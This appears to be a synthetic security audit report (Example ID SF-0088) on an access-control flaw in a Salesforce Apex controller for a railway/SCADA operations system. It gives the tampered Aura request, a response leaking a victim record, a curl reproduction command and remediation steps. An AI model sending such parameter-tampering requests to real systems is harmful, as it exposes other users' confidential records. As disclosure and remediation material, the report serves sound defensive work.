# Security Analysis Report
**System:** RailCore Operations API (Salesforce-Integrated)
**Domain:** Railway / SCADA
**Example ID:** SF-0088
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.4 | Privilege escalation via parameter tampering on `CaseController.getCaseDetails` — attacker reads any SCADA railway Case record |

---

## Finding 1 — BAC: Privilege Escalation via Parameter Tampering on Case Object (Pattern 2.4)

### Summary
The Apex controller `CaseController` on RailCore Operations API (`5b1a374a.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Case object. Per §5.0 Pattern 2.4, the client-controlled `caseId` parameter enables privilege escalation. Railway/SCADA Case records may contain critical operational data.

**Pattern:** 2.4 — Privilege escalation via parameter tampering (BAC)
**Affected controller:** `c.CaseController.getCaseDetails`
**Affected endpoint:** `POST https://5b1a374a.lightning.force.com/aura`
**Note:** Apex method name and Aura descriptor both use `getCaseDetails` — consistent within context.txt.

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://5b1a374a.lightning.force.com/aura
Authorization: Bearer 00D5B1A374A!AR5b1a374a...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D5B1A374A!AR5b1a374a...

message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN",
"params":{"caseId":"001374A","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Case Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001374A", "Name": "Victim Case Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-32-8617"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D5B1A374A!AR5b1a374a..."
curl -s -X POST "https://5b1a374a.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN","params":{"caseId":"001374A","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-32-8617
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class CaseController { ... }`
2. `WHERE Id = :caseId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
